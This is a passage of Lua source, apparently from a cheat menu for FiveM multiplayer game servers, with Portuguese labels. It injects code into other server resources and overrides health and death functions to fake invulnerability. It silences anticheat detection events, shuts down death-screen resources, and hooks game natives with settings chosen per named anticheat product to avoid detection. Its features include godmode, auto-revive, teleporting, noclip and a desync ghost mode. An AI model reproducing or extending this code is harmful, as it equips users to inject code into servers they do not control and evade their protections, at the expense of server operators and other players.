                SetPedCanRagdoll                    = function() return true end
                SetPedCanRagdollFromPlayerImpact    = function() return true end
                SetPedCanBeKnockedOffVehicle        = function() return true end
                ResurrectPed                        = function() return true end
                NetworkResurrectLocalPlayer         = function() return true end
                ClearPedBloodDamage                 = function() return true end
                ClearPedBloodDamageByZone           = function() return true end
                ResetPedVisibleDamage               = function() return true end
                ClearPedTasks                       = function() return true end
                ClearPedTasksImmediately            = function() return true end
                ClearPedSecondaryTask               = function() return true end
                ClearPedLastDamageBone              = function() return true end
                SetPedToRagdoll                     = function() return true end
                FreezeEntityPosition                = function() return true end
                _G.SetEntityHealth                  = function() return true end
                _G.SetEntityInvincible              = function() return true end
                _G.SetPlayerInvincible              = function() return true end
                _G.ResurrectPed                     = function() return true end
                _G.NetworkResurrectLocalPlayer      = function() return true end
                _G.ClearPedBloodDamage              = function() return true end
                _G.ClearPedTasks                    = function() return true end
                _G.FreezeEntityPosition             = function() return true end
            end

            local function healthDetection()
                local realGetEntityHealth = GetEntityHealth
                GetEntityHealth = function(ent)
                    local myPed = PlayerPedId()
                    if ent == myPed then return 200 end
                    return realGetEntityHealth(ent) or 200
                end
                IsEntityDead                        = function() return false end
                IsPlayerDead                        = function() return false end
                IsPedFatallyInjured                 = function() return false end
                IsPedDeadOrDying                    = function() return false end
                IsPedInjured                        = function() return false end
                GetEntityMaxHealth                  = function() return 200 end
                GetPedArmour                        = function() return 100 end
                _G.GetEntityHealth                  = GetEntityHealth
                _G.IsEntityDead                     = function() return false end
                _G.IsPlayerDead                     = function() return false end
                _G.IsPedFatallyInjured              = function() return false end
                _G.IsPedDeadOrDying                 = function() return false end
                _G.GetEntityMaxHealth               = function() return 200 end
            end

            local function damageBlockOverrides()
                GetWeaponDamageModifier             = function() return 1.0 end
                GetPlayerWeaponDamageModifier       = function() return 1.0 end
                SetWeaponDamageModifier             = function() end
                CEventNetworkEntityDamage           = function() return 0.0 end
                ApplyDamageToPed                    = function() return true end
                ApplyDamageToVehicle                = function() return true end
                _G.GetWeaponDamageModifier          = function() return 1.0 end
                _G.GetPlayerWeaponDamageModifier    = function() return 1.0 end
                _G.SetWeaponDamageModifier          = function() end
                _G.CEventNetworkEntityDamage        = function() return 0.0 end
                _G.ApplyDamageToPed                 = function() return true end
                _G.ApplyDamageToVehicle             = function() return true end
            end

            local function neutralEvents()
                for _, evt in ipairs({
                    "onPlayerKilled", "CEventNetworkPlayerKilled",
                    "CEventNetworkEntityKilled", "CEventNetworkEntityDamage",
                    "gameEventTriggered", "deathEvent",
                    "playerDied", "playerRevived",
                    "AC:Death", "AC:Revive", "AC:Detection",
                    "vrp:playerDead", "vrp:playerSpawn",
                    "hud:Active", "resetBleeding",
                    "resetDiagnostic", "mirtin_survival:onDeath",
                }) do
                    AddEventHandler(evt, function() end)
                end
            end
            pcall(neutralEvents)

            pcall(function()
                reviveOverrides()
                healthDetection()
                damageBlockOverrides()
            end)

            Citizen.CreateThread(function()
                while _hxp_revive_ver == myVersion do
                    pcall(reviveOverrides)
                    pcall(healthDetection)
                    pcall(damageBlockOverrides)
                    Wait(500)
                end
            end)
        end)
        ]])
    end

    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)

    SetEntityCollision(ped, true, true)
    FreezeEntityPosition(ped, false)
    ClearPedTasks(ped)
    ClearPedTasksImmediately(ped)
    ClearPedSecondaryTask(ped)
    ClearPedBloodDamage(ped)
    ResetPedVisibleDamage(ped)

  
      FrameAPI.Inject('survival', [[
		SetNuiFocus(false, false)
		SetNuiFocusKeepInput(false)
		SendNUIMessage({ Action = "SetVisible", Visible = false, show = false })
        Wait(100)
		deathBlurActive = false
		TriggerScreenblurFadeOut(450)
		TransitionFromBlurred(450)
		ClearTimecycleModifier()
        ]])

    local deathResources = {
        'mirtin_survival', 'nxgroup-survival', 'vrp_survival',
        'garty-survival', 'lisboa-survival', 'dharma_survival', 'wnSurvival',
        'deadscreen', 'ic3d_deathscreen', 'DeathScreen', 'uniq-deathscreen',
        'neo_death', 'europa_deathscreen', 'mirtin_survival_v2', 'death',
        'nyo_death', 'qb-death', 'painel_hospital'
    }
    for _, resource in ipairs(deathResources) do
        pcall(function() FrameAPI.StopResource(resource) end)
    end

    pcall(function()
        FrameAPI.Inject('mirtin_survival', [[
            SetNuiFocus(false, false)
            NuiFocus = false
            SendNUIMessage({ action = "setVisible", data = false })
        ]])
    end)

    pcall(function()
        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
    end)

    Wait(100)

    pcall(function()
        FrameAPI.Inject('vrp', [[
        Citizen.CreateThread(function()
            local Tunnel = module('vrp', 'lib/Tunnel')
            local Proxy = module('vrp', 'lib/Proxy')
            vRP = Proxy.getInterface('vRP')
            local x, y, z = table.unpack(GetEntityCoords(PlayerPedId()))
            NetworkResurrectLocalPlayer(x, y, z, GetEntityHeading(PlayerPedId()), true, false)
            ClearPedBloodDamage(PlayerPedId())
            vRP.setHealth(400)
            ClearPedTasks(PlayerPedId())
            TriggerEvent('resetBleeding')
            TriggerEvent('resetDiagnostic')
            TriggerEvent("vRP:playerDead", false)
            Dead = false
            LocalPlayer['state']['BlockControls'] = false
            LocalPlayer.state.finished = false
            TriggerEvent("hud:Active", true)
        end)
        ]])
    end)

    Wait(150)

    if GetEntityHealth(ped) <= 100 then
        local attempts = {
            function() SetEntityHealth(ped, 400) end,
            function() LocalPlayer.state["health"] = 400 end,
            function() LocalPlayer.state["curhealth"] = 400 end,
            function() NetworkResurrectLocalPlayer(GetEntityCoords(ped), GetEntityHeading(ped), 0, 0) end,
            function() ResurrectPed(ped) end,
            function() SetEntityHealth(ped, 200) end,
        }
        for _, attempt in ipairs(attempts) do
            pcall(attempt)
            Wait(100)
            if GetEntityHealth(ped) > 100 then break end
        end
    end

    SetPedArmour(ped, 100)
    next.elements.notify("Revivido com sucesso!", "success")
end)
end
next.elements.checkbox("Reviver Ao Morrer", "reviveraomorrer", function(state)
    if state then
        nt.createTh(function()
            while next.values.checkbox["reviveraomorrer"] do
                local ped = PlayerPedId()
                if GetEntityHealth(ped) <= 100 or IsEntityDead(ped) or IsPedFatallyInjured(ped) then
                    Reviver()
                    Wait(1500)
                end
                Wait(500)
            end
        end)
    end
end)
                    next.elements.button("Curar vida", "curar_vida", function()
                        SetEntityHealth(PlayerPedId(), 400)
                        next.elements.notify("Vida curada com sucesso!", "success")
                    end)
                    next.elements.button("Suicidio", "suicidio", function()
                        SetEntityHealth(PlayerPedId(), 0)
                    end)
                if anticheat == "likizao_ac" or anticheat == "Não Detectado" or anticheat == "ThnAC" then
                     next.elements.slider("Setar Vida", "setVida", {min = 0,max = 400, start = 100}, function()
                        SetEntityHealth(PlayerPedId(), next.values.slider["setVida"])
                    end)
                    next.elements.slider("Setar Colete", "setColete", {min = 0,max = 100, start = 20}, function()
                        SetPedArmour(PlayerPedId(), next.values.slider["setColete"])
                    end)
                end
                if group == "Santa Group" then
                    next.elements.checkbox("Godmode", "God2Mode", function(bool)
                    if bool then
                         SetEntityInvincible(PlayerPedId(),true)
                         LocalPlayer["state"]["Invincible"] = true
                    else
                         SetEntityInvincible(PlayerPedId(),false)
                         LocalPlayer["state"]["Invincible"] = false
                    end
                    end)
                end
                if anticheat == "PL_PROTECT" or anticheat == "ThnAC"  or anticheat == "likizao_ac" or anticheat == "Não Detectado" or anticheat == "Fiveguard" or anticheat == "EQPG" then
                    if group ~= "Santa Group" then
                    next.elements.checkbox("Godmode", "GodMode", function(bool)
                    if bool then
                        SetEntityOnlyDamagedByRelationshipGroup(PlayerPedId(), true, tostring(math.random(1000000, 9999999)))
                    else
                        SetEntityOnlyDamagedByRelationshipGroup(PlayerPedId(), false, nil)
                    end
                    end)
                end
                end
                next.elements.checkbox("Modo Energetico", "modo_energetico", function(bool)
                    if bool then
                    SetRunSprintMultiplierForPlayer(PlayerId(),1.40)
                    else 
                    SetRunSprintMultiplierForPlayer(PlayerId(),1.0)
                    end
                end)
                    next.elements.checkbox("Forçar Minimapa", "forceminimap", function(bool)
                        nt.createTh(function()
                            while next.values.checkbox["forceminimap"] do
                                Wait(1)
                                DisplayRadar(true)
                            end
                        end)
                    end)
                    next.elements.checkbox("Atravessar Paredes", "atravessarparedes", function()
                        nt.createTh(function()
                            while next.values.checkbox["atravessarparedes"] do
                                Wait(1)
                                SetPedCapsule(PlayerPedId(), 0.001)
                            end
                        end)
                    end)
                    next.elements.button("Limpar Ferimentos", "limpar:ferimentos", function()
                        ClearPedBloodDamage(PlayerPedId())
                    end)
                    next.elements.button("Secar Roupas", "secar:roupas", function()
                        ClearPedWetness(PlayerPedId())
                    end)
                    next.elements.groupbox("Segundario", "secundario", "\xee\x93\xa5", 305, 0, 290, 260)
if anticheat ~= "Fiveguard" then
    next.elements.button("Teleportar para Waypoint", "tpway", function()
        nt.createTh(function()
            local ped = PlayerPedId()
            local vehicle = nil

            if IsPedInAnyVehicle(ped, false) then
                vehicle = GetVehiclePedIsUsing(ped)
            end

            local blip = GetFirstBlipInfoId(8)
            if not DoesBlipExist(blip) then
                next.elements.notify("Marque um waypoint no mapa!", "warning")
                return
            end

            local wayp = GetBlipInfoIdCoord(blip)

            ClearGpsPlayerWaypoint()
            DeleteWaypoint()
            SetNewWaypoint(wayp.x + 1000.0, wayp.y + 1000.0)
            Wait(1000)

            for height = 1, 1000 do
                local entity = vehicle or ped
                SetEntityCoords(entity, wayp.x - 5.0, wayp.y, height + 0.0, false, false, false, false)

                local foundGround, groundZ = GetGroundZFor_3dCoord(wayp.x - 5.0, wayp.y, height + 0.0, false)
                if foundGround then
                    SetEntityCoords(entity, wayp.x - 5.0, wayp.y, groundZ + 0.0, false, false, false, false)
                    Wait(200)
                    DeleteWaypoint()
                    next.elements.notify("Teleportado para o waypoint!", "success")
                    break
                end

                Wait(1)
            end
        end)
    end)

    next.elements.checkbox("Auto Teleportar para Waypoint", "autoTP", function(bool)
        if not bool then return end

        nt.createTh(function()
            local groundCheckHeights = {
                0, 50.0, 100.0, 150.0, 200.0, 250.0, 300.0, 350.0,
                400.0, 450.0, 500.0, 550.0, 600.0, 650.0, 700.0, 750.0,
                800.0, 850.0, 900.0, 950.0, 1000.0, 1050.0, 1100.0
            }

            while next.values.checkbox["autoTP"] do
                local waypointBlip = GetFirstBlipInfoId(8)

                if DoesBlipExist(waypointBlip) then
                    local ped = PlayerPedId()
                    local vehicle = nil
                    if IsPedInAnyVehicle(ped, false) then
                        vehicle = GetVehiclePedIsUsing(ped)
                    end

                    local x, y, z = table.unpack(Citizen.InvokeNative(
                        0xFA7C7F0AADF25D09,
                        waypointBlip,
                        Citizen.ResultAsVector()
                    ))

                    local groundFound = false
                    local groundZ = z
                    local entity = vehicle or ped

                    DeleteWaypoint()
                    ClearGpsPlayerWaypoint()
                    Wait(1000)

                    for _, height in ipairs(groundCheckHeights) do
                        SetEntityCoordsNoOffset(entity, x, y, z, false, false, true)
                        RequestCollisionAtCoord(x, y, z)

                        local collisionStart = GetGameTimer()
                        while not HasCollisionLoadedAroundEntity(entity)
                            and (GetGameTimer() - collisionStart) < 3000
                            and next.values.checkbox["autoTP"] do
                            RequestCollisionAtCoord(x, y, z)
                            Wait(1)
                        end

                        local found, checkedZ = GetGroundZFor_3dCoord(x, y, height, false)
                        if found then
                            groundZ = checkedZ + 1.0
                            groundFound = true
                            break
                        end

                        Wait(1)
                    end

                    if not groundFound then
                        groundZ = 1200.0
                    end

                    RequestCollisionAtCoord(x, y, groundZ)
                    local finalCollisionStart = GetGameTimer()
                    while not HasCollisionLoadedAroundEntity(entity)
                        and (GetGameTimer() - finalCollisionStart) < 3000
                        and next.values.checkbox["autoTP"] do
                        RequestCollisionAtCoord(x, y, groundZ)
                        Wait(1)
                    end

                    if next.values.checkbox["autoTP"] then
                        SetEntityCoordsNoOffset(entity, x, y, groundZ, true, true, true)
                    end
                end

                Wait(1)
            end
        end)
    end)
end
                    next.elements.checkbox("Mundo Solo", "mundo", function(bool)
                        while next.values.checkbox["mundo"] do
                            Wait(0)
                            next['functions']['hook'](0xF3929C2379B60CCE, false)
                            next['functions']['hook'](0xADA24309FE08DACF, false)
                            next['functions']['hook'](0xCEF70AA5B3F89BA1, false)
                            NetworkStartSoloTutorialSession()
                            if not next.values.checkbox["mundo"] then
                                NetworkEndTutorialSession()
                            end
                        end
                    end)
                    next.elements.checkbox("Habilitar Cover", "enableCover", function(bool)
                        if next.values.checkbox["enableCover"] then
                            nt.createTh(function()
                                while next.values.checkbox["enableCover"] do
                                    RemoveAllCoverBlockingAreas()
                                    SetPedCombatAttributes(PlayerPedId(), 0, true)
                                    SetPedCanCowerInCover(PlayerPedId(), true)
                                    SetPedCanPeekInCover(PlayerPedId(), true)
                                    SetPlayerCanUseCover(PlayerPedId(), true)
                                    SetPedCombatAttributes(PlayerPedId(), 0, true)
                                    DisableControlAction(1, 44, false)
                                    EnableControlAction(1, 44, true)
                                    DisableControlAction(0, 44, false)
                                    EnableControlAction(0, 44, true)
                                    Wait(1)
                                end
                            end)
                        end
                    end)
                    next.elements.checkbox("No Ragdoll", "norag", function(bool)
                    nt.createTh(function()
                        while next.values.checkbox["norag"] do
                            SetPedRagdollOnCollision(PlayerPedId(), false)
                            SetPedRagdollBlockingFlags(PlayerPedId(), 1)
                            SetPedRagdollBlockingFlags(PlayerPedId(), 2)
                            SetPedRagdollBlockingFlags(PlayerPedId(), 4)
                            SetPedCanRagdoll(PlayerPedId(), false)
                            Wait(0)
                        end
                        SetPedRagdollOnCollision(PlayerPedId(), true)
                        SetPedCanRagdoll(PlayerPedId(), true)
                    end)
                end)
                    next.elements.checkbox("Virar Fantasma", "desync", function(bool)
                        nt.createTh(function()
                            local modelHash = GetHashKey('mp_m_freemode_01')
                            while not HasModelLoaded(modelHash) do
                                RequestModel(modelHash)
                                Wait(10)
                            end
                            local coords = GetEntityCoords(PlayerPedId())
                            desyncPed = ClonePed(PlayerPedId(), false, false, false)
                            SetEntityCoords(desyncPed, coords)
                            if IsEntityAttached(PlayerPedId()) then
                                DetachEntity(PlayerPedId(), true, false)
                                local entity = GetEntityAttachedTo(PlayerPedId())
                                DeletePed(entity)
                            end
                            SetCanAttackFriendly(desyncPed, true, false)
                            SetFocusEntity(desyncPed)
                            SetEntityAsMissionEntity(desyncPed)
                            SetPedAlertness(desyncPed, 0.0)
                            SetGameplayCamFollowPedThisUpdate(desyncPed)
                            ClearPedTasks(desyncPed)
                            ClearPedSecondaryTask(desyncPed)
                            SetPedKeepTask(desyncPed, false)
                            FreezeEntityPosition(PlayerPedId(), true)
                            RequestCollisionAtCoord(GetEntityCoords(desyncPed))
                            SetHdArea(GetEntityCoords(desyncPed), 50.0)
                            SetEntityInvincible(desyncPed, true)
                            FreezeEntityPosition(PlayerPedId(), true)
                            while next.values.checkbox["desync"] do
                                AttachEntityToEntity(PlayerPedId(), desyncPed, 0, 0.0, 0.0, -25.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                if not DoesEntityExist(desyncPed) then
                                    next.values.checkbox["desync"] = false
                                    break
                                end
                                SetEntityOnlyDamagedByRelationshipGroup(PlayerPedId(), true)
                                SetGameplayCamFollowPedThisUpdate(desyncPed)
                                local vehicle = GetVehiclePedIsUsing(desyncPed)
                                if vehicle then
                                    SetPedKeepTask(desyncPed, false)
                                    ClearVehicleTasks(vehicle)
                                end
                                TaskStandStill(PlayerPedId(), 10)
                                SetPedKeepTask(desyncPed, false)
                                local coords = GetEntityCoords(desyncPed)
                                local _coords = coords
                                local sprint = false
                                if IsDisabledControlPressed(0, 21) then
                                    TaskStandStill(PlayerPedId(), 10)
                                    sprint = true
                                end
                                if next.values.checkbox["p"] then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    SetEntityAsMissionEntity(desyncPed)
                                    TaskJump(desyncPed, true)
                                    local player_coords = GetEntityCoords(desyncPed)
                                    local player_cam_rot = GetGameplayCamRot(0)
                                    local forward, right = GetEntityMatrix(desyncPed)
                                    local is_in_vehicle = IsPedInAnyVehicle(desyncPed, false)
                                    local entity = is_in_vehicle and GetVehiclePedIsIn(desyncPed, false) or desyncPed
                                    local noclip_speed = next.values.slider["noclip_speed"] or 1.0
                                    if IsDisabledControlPressed(0, 32) then
                                        player_coords = player_coords + forward * noclip_speed
                                    end
                                    if IsDisabledControlPressed(0, 33) then
                                        player_coords = player_coords + forward * -noclip_speed
                                    end
                                    if IsDisabledControlPressed(0, 30) then
                                        player_coords = player_coords + right * noclip_speed
                                    end
                                    if IsDisabledControlPressed(0, 34) then
                                        player_coords = player_coords + right * -noclip_speed
                                    end
                                    if IsDisabledControlPressed(0, 22) then
                                        player_coords = vector3(player_coords.x, player_coords.y, player_coords.z + noclip_speed)
                                    end
                                    if IsDisabledControlPressed(0, 36) then
                                        player_coords = vector3(player_coords.x, player_coords.y, player_coords.z - noclip_speed)
                                    end
                                    FreezeEntityPosition(entity, true)
                                    FreezeEntityPosition(PlayerPedId(), true)
                                    SetEntityCoordsNoOffset(entity, player_coords.x, player_coords.y, player_coords.z, true, true, true)
                                    SetEntityRotation(entity, player_cam_rot.x, player_cam_rot.y, player_cam_rot.z, 0, true)
                                else
                                    local is_in_vehicle = IsPedInAnyVehicle(desyncPed, false)
                                    local entity = is_in_vehicle and GetVehiclePedIsIn(desyncPed, false) or desyncPed
                                    FreezeEntityPosition(entity, false)
                                    FreezeEntityPosition(PlayerPedId(), false)
                                end
                                if IsDisabledControlJustPressed(0, 321) and not IsPedJumping(desyncPed) then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    SetEntityAsMissionEntity(desyncPed)
                                    TaskJump(desyncPed, true)
                                end
                                if IsDisabledControlPressed(0, 321) then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    SetEntityAsMissionEntity(desyncPed)
                                    TaskJump(desyncPed, true)
                                end
                                if IsDisabledControlPressed(0, 32) then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    SetEntityAsMissionEntity(desyncPed)
                                    coords = coords+(next.functions.rot_to_dir(GetGameplayCamRot(2), true) * 6.0)
                                elseif IsDisabledControlPressed(0, 33) then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    SetEntityAsMissionEntity(desyncPed)
                                    coords = coords-(next.functions.rot_to_dir(GetGameplayCamRot(2), true) * 6.0)
                                end
                                if IsDisabledControlPressed(0, 34) then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    local cam = GetGameplayCamRot(2)
                                    local rot = next.functions.rot_to_dir(vector3(cam.x, cam.y, cam.z + 90.0), true) * 6.0
                                    coords = coords + rot
                                elseif IsDisabledControlPressed(0, 35) then
                                    NetworkRequestControlOfEntity(desyncPed)
                                    local cam = GetGameplayCamRot(2)
                                    local rot = next.functions.rot_to_dir(vector3(cam.x, cam.y, cam.z - 90.0), true) * 6.0
                                    coords = coords + rot
                                end
                                if coords == _coords then
                                    if aiming then
                                        TaskAimGunAtCoord(desyncPed, aim_coords.x, aim_coords.y, aim_coords.z, 1000.0, false, false)
                                    elseif GetVehiclePedIsEntering(desyncPed) == 0 and GetVehiclePedIsTryingToEnter(desyncPed) == 0 then
                                        ClearPedTasks(desyncPed)
                                    end
                                else
                                    if aiming then
                                        TaskGoToCoordWhileAimingAtCoord(desyncPed, coords.x, coords.y, coords.z, aim_coords.x, aim_coords.y, aim_coords.z, sprint and 10.0 or 1.0, false, 2.0, 0.5, false, 512, false, 0xC6EE6B4C)
                                    else
                                        TaskGoStraightToCoord(desyncPed, coords.x, coords.y, coords.z, sprint and 10.0 or 1.0, 1000.0, 0.0, 0.4)
                                    end
                                end
                                Wait(1)
                            end
                            if not next.values.checkbox["desync"] then
                                local lastCoords = GetEntityCoords(desyncPed)
                                SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
                                DeletePed(desyncPed)
                                FreezeEntityPosition(PlayerPedId(), false)
                            end
                        end)
                    end)
                    next.elements.checkbox("Folego Infinito", "folegoinf", function()
                        if next.values.checkbox["folegoinf"] then
                            nt.createTh(function()
                                while next.values.checkbox['folegoinf'] do
                                    RestorePlayerStamina(PlayerId(), 1.0)
                                    Wait(1)
                                end
                            end)
                        else
                            RestorePlayerStamina(PlayerId(), 1.0)
                        end
                    end)
                    next.elements.checkbox("Congelar-se", "congelarse", function()
                        if next.values.checkbox["congelarse"] then
                            FreezeEntityPosition(PlayerPedId(), true)
                        else
                            FreezeEntityPosition(PlayerPedId(), false)
                        end
                    end)
                    next.elements.checkbox("Soco Rapido", "rapidosoco", function(state)
                        if state then
                        nt.createTh(function()
                        while next.values.checkbox["rapidosoco"] do
                        Wait(950)
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) and not IsEntityDead(ped) then
                        if IsControlPressed(0, 24) then
                        ClearPedTasksImmediately(ped)
                        end
                        end
                        end
                        end)
                        end
                        end)
                    next.elements.checkbox("Habilitar chute na moto", "kickmoto", function(bool)
                        if next.values.checkbox["kickmoto"] then
                            nt.createTh(function()
                                while next.values.checkbox["kickmoto"] do
                                    SetPlayerCanDoDriveBy(PlayerId(), true)
                                    EnableControlAction(0, 140, true)
                                    EnableControlAction(0, 141, true)
                                    EnableControlAction(0, 142, true)
                                    EnableControlAction(0, 158, true)
                                    EnableControlAction(0, 263, true)
                                    EnableControlAction(0, 264, true)
                                    EnableControlAction(0, 345, true)
                                    Wait(1)
                                end
                            end)
                        end
                    end)
                    local prop_agua = nil
                    local threadAtiva = false
                    next.elements.checkbox("Andar sobre a Agua", "andar_na_agua", function(bool)
                        if bool then
                            if not threadAtiva then
                                threadAtiva = true
                                nt.createTh(function()
                                    local model = GetHashKey("apa_mp_h_acc_rugwoolm_01")
                                    RequestModel(model)
                                    while not HasModelLoaded(model) do
                                        Wait(100)
                                    end
                                    if not prop_agua then
                                        local coords = GetEntityCoords(PlayerPedId())
                                        local _, waterZ = GetWaterHeight(coords.x, coords.y, coords.z)
                                        prop_agua = CreateObject(model, coords.x, coords.y, waterZ, false, false, false)
                                        SetEntityVisible(prop_agua, false)
                                        SetEntityAlpha(prop_agua, 0, false)
                                        SetEntityCollision(prop_agua, true, true)
                                        SetEntityRotation(prop_agua, 0.0, 0.0, 0.0, 2, true)
                                        SetEntityDynamic(prop_agua, true)
                                        FreezeEntityPosition(prop_agua, true)
                                    end
                                    while next.values.checkbox["andar_na_agua"] do
                                        local coords = GetEntityCoords(PlayerPedId())
                                        local _, waterZ = GetWaterHeight(coords.x, coords.y, coords.z)
                                        if prop_agua then
                                            SetEntityHeading(prop_agua, GetEntityHeading(PlayerPedId()))
                                            SetEntityCoordsNoOffset(prop_agua, coords.x, coords.y, waterZ, true, true, true)
                                        end
                                        Wait(200)
                                    end
                                    if prop_agua then
                                        DeleteEntity(prop_agua)
                                        prop_agua = nil
                                    end
                                    threadAtiva = false
                                end)
                            end
                        else
                            if prop_agua then
                                DeleteEntity(prop_agua)
                                prop_agua = nil
                            end
                            threadAtiva = false
                        end
                    end)
                    next.elements.checkbox("Nadar Rapido", "super_swing", function(bool)
                        if bool then
                        nt.createTh(function()
                        while next.values.checkbox["super_swing"] do
                        Wait(0)
                        SetSwimMultiplierForPlayer(PlayerId(), 1.49)
                        end
                        SetSwimMultiplierForPlayer(PlayerId(), 1.0)
                        end)
                        else
                        SetSwimMultiplierForPlayer(PlayerId(), 1.0)
                        end
                        end)
                    next.elements.groupbox("Poderes", "powers", "\xef\x81\xad", 305, 280, 290, 160)

local specialNoclipAC = (anticheat == "PL_PROTECT" or anticheat == "likizao_ac" or anticheat == "EQPG" or anticheat == "Não Detectado")

if not specialNoclipAC then
next.elements.combobox("Modo de NoClip", "modoNc", {"Noclip", "Noclip Solo 1", "Noclip Solo 2", "Noclip Invisibility"}, "Noclip", function(value)
end)
end

if specialNoclipAC then
next.elements.combobox("Modo de NoClip", "modoNc", {"Normal", "Invisivel", "Solo Session"}, "Normal", function(value)
end)
end

if not specialNoclipAC then
next.elements.checkbox("Noclip", "noclip", function(bool)
    if bool then
        nt.createTh(function()
            if anticheat == "Waveshield" or anticheat == "Fiveguard" or anticheat == "Não Detectado" or anticheat == "ElectronAC" then
                FrameAPI.Scripting.HookNative(0x7DCE8BDA0F1C1200, true)
                FrameAPI.Scripting.HookNative(0x79CFD9827CC979B6, 0)
                FrameAPI.Scripting.HookNative(0x94495889E22C6479, true)
            end
            
            if anticheat == "FiniAC" then
                FrameAPI.Scripting.HookNative(0x7DCE8BDA0F1C1200, true)
                FrameAPI.Scripting.HookNative(0x79CFD9827CC979B6, 2)
                FrameAPI.Scripting.HookNative(0x94495889E22C6479, true)
                FrameAPI.Scripting.HookNative(0xCEDABC5900A0BF97, false)
                FrameAPI.Scripting.HookNative(0xFB92A102F1C4DFA3, true)
                FrameAPI.Scripting.HookNative(0x1DD55701034110E5, 1.0)
            end

            if anticheat == "reaperv4" then
                nt.createTh(function()
                    while true do
                        Wait(0)
                        next.Coords = GetEntityCoords(PlayerPedId())
                    end
                end)
                FrameAPI.Scripting.HookNative(0xA200EB1EE790F448, next.Coords)
                FrameAPI.Scripting.HookNative(0x14D6F5678D8F1B37, next.Coords)
                FrameAPI.Scripting.HookNative(0x5234F9F10919EABA, -1)
                FrameAPI.Scripting.HookNative(0x580417101DDB492F, false)
                FrameAPI.Scripting.HookNative(0xDFB2B516207D3534, false)
                FrameAPI.Scripting.HookNative(0x39B5D1B10383F0C8, true)
                FrameAPI.Scripting.HookNative(0xEE778F8C7E1142E2, 1)
                FrameAPI.Scripting.HookNative(0x8D4D46230B2C353A, 4)
                FrameAPI.Scripting.HookNative(0xE659E47AF827484B, true)
                FrameAPI.Scripting.HookNative(0xB15162CB5826E9E8, true)
                FrameAPI.Scripting.HookNative(0xF5F1E89A970B7796, true)
                FrameAPI.Scripting.HookNative(0xC3330A45CCCDB26A, 50.0)
                FrameAPI.Scripting.HookNative(0x65019750A0324133, 50.0)
                FrameAPI.Scripting.HookNative(0x7DCE8BDA0F1C1200, true)
                FrameAPI.Scripting.HookNative(0x79CFD9827CC979B6, 2)
                FrameAPI.Scripting.HookNative(0x94495889E22C6479, true)
            end
            
            if anticheat == "Waveshield" or anticheat == "Fiveguard" or anticheat == "Não Detectado" or anticheat == "EagleAC" then
                if next.values.combobox['modoNc'] == "Noclip Solo 2" then
                    nt.createTh(function()
                        while true do
                            Wait(0)
                            next.Coords = GetEntityCoords(PlayerPedId())
                        end
                    end)
                    FrameAPI.Scripting.HookNative(0xA200EB1EE790F448, next.Coords)
                    FrameAPI.Scripting.HookNative(0x19CAFA3C87F7C2FF, 1)
                    FrameAPI.Scripting.HookNative(0x14D6F5678D8F1B37, next.Coords)
                    FrameAPI.Scripting.HookNative(0x5234F9F10919EABA, -1)
                    FrameAPI.Scripting.HookNative(0x580417101DDB492F, false)
                    FrameAPI.Scripting.HookNative(0xDFB2B516207D3534, false)
                    FrameAPI.Scripting.HookNative(0x39B5D1B10383F0C8, true)
                    FrameAPI.Scripting.HookNative(0xEE778F8C7E1142E2, 1)
                    FrameAPI.Scripting.HookNative(0x8D4D46230B2C353A, 4)
                    FrameAPI.Scripting.HookNative(0xE659E47AF827484B, true)
                    FrameAPI.Scripting.HookNative(0xB15162CB5826E9E8, true)
                    FrameAPI.Scripting.HookNative(0xF5F1E89A970B7796, true)
                    FrameAPI.Scripting.HookNative(0xC3330A45CCCDB26A, 50.0)
                    FrameAPI.Scripting.HookNative(0x65019750A0324133, 50.0)
                    FrameAPI.Scripting.HookNative(0x7DCE8BDA0F1C1200, true)
                    FrameAPI.Scripting.HookNative(0x79CFD9827CC979B6, 2)
                    FrameAPI.Scripting.HookNative(0x94495889E22C6479, true)
                    FrameAPI.Scripting.HookNative(0xE31C2C72B8692B64, true)
                    FrameAPI.Scripting.HookNative(0xD9D2CFFF49FAB35F, true)
                end
            end
            
            local modo = next.values.combobox['modoNc'] or "Noclip"
            
            if modo == "Noclip" then
                while next.values.checkbox["noclip"] do
                    Wait(0)
                    local ped = PlayerPedId()
                    local lastCoords = GetEntityCoords(ped)
                    if not lastCoords then
                        lastCoords = GetEntityCoords(ped)
                    end
                    local camRot = GetFinalRenderedCamRot(2)
                    local forward = vector3(
                        -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x)),
                        math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x)),
                        math.sin(math.rad(camRot.x))
                    )
                    local right = vector3(
                        math.cos(math.rad(camRot.z)),
                        math.sin(math.rad(camRot.z)),
                        0.0
                    )
                    local speed = next.values.slider["nC_Speed"] + 0.0
                    if IsControlPressed(0, 21) then
                        speed = speed * 3.0
                    end
                    
                    if IsDisabledControlPressed(0, 32) then
                        lastCoords = lastCoords + forward * speed
                    end
                    if IsDisabledControlPressed(0, 33) then
                        lastCoords = lastCoords - forward * speed
                    end
                    if IsDisabledControlPressed(0, 30) then
                        lastCoords = lastCoords + right * speed
                    end
                    if IsDisabledControlPressed(0, 34) then
                        lastCoords = lastCoords - right * speed
                    end
                    if IsDisabledControlPressed(0, 22) then
                        lastCoords = lastCoords + vector3(0, 0, speed)
                    end
                    if IsDisabledControlPressed(0, 36) then
                        lastCoords = lastCoords - vector3(0, 0, speed)
                    end
                    
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        SetEntityCollision(veh, false, false)
                        FreezeEntityPosition(veh, true)
                        SetEntityCoordsNoOffset(veh, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
                        SetEntityRotation(veh, camRot.x, 0.0, camRot.z, 2, true)
                        FreezeEntityPosition(veh, false)
                        SetEntityCollision(veh, true, true)
                    else
                        SetEntityCoordsNoOffset(ped, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
